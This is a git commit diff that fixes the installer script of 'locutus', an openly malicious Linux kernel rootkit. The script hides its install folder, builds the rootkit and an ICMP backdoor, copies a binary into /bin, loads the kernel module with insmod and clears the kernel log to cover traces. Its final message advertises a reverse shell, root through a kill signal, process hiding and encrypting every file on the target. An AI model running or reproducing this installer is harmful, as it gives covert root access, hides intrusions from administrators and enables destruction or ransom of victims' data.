cab34a26a8e7b71fa32a31f46f7f1d8b8bbb61b5
Terraminator <terraminator@protonmail.com>
2023-06-05 14:54:58 +0200

    fix install_locutus.sh

--- install_locutus.sh
+++ install_locutus.sh
@@ -2,12 +2,14 @@
 echo "installing locutus..."
 mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden
 
-cd locutus
 sudo apt install build-essential -y # prepare for building
-bash make.sh # build rk
-sudo mv borg_transwarp /bin/
+
 mv locutus borg_locutus # add magic prefix
-insmod borg_locutus # insert lkm
+cd borg_locutus
+bash make.sh # build rk and icmp backdoor
+sudo mv borg_transwarp /bin/
+mv locutus.ko borg_locutus.ko
+insmod borg_locutus.ko # insert lkm
 dmesg --clear # clear log
 
 echo -ne "installed!\nget a reverse shell by running locutus/trigger.sh <target ip>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\n"
